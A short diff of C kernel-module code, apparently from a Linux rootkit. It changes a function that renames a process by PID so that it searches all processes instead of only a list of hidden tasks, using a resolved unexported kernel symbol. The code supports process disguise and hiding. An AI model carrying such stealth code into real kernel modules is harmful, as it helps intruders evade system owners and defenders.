@@ -417,17 +417,17 @@ void kv_pid_cleanup(void) {
 }
 
 void kv_rename_task(pid_t pid, const char *newname) {
-    struct hidden_tasks *node, *node_safe;
+    struct task_struct *task;
     char buf[TASK_COMM_LEN] = {0};
 
     struct kernel_syscalls *ks = kv_kall_load_addr();
     if (!ks || !newname || pid <= 1)
         return;
 
-    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
-        if (pid == node->task->pid) {
-            ks->k__set_task_comm(node->task, newname, false /** not restart/new process */);
-            get_task_comm(buf, node->task);
+    for_each_process(task) {
+        if (pid == task->pid) {
+            ks->k__set_task_comm(task, newname, false /** not restart/new process */);
+            get_task_comm(buf, task);
             if (*buf != 0)
                 prinfo("New process name: '%s'\n", buf);
             break;
